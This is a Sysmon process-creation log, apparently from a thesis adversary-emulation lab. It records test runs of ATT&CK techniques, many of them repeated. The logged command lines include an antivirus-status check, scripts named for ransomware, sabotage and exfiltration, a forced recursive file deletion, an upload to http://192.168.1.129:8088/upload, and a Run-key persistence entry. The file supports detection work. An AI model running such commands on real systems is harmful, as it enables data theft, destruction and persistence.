2026-06-24T12:52:15.255Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.934Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.805Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.853Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.640Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.557Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.640Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.557Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.240Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.413Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.887Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.240Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.413Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.887Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.089Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.089Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.618Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.110Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.618Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.110Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:41.845Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:41.845Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.551Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.576Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.551Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.576Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.462Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.499Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.653Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.687Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.462Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.499Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.653Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.687Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.788Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.806Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.788Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.806Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
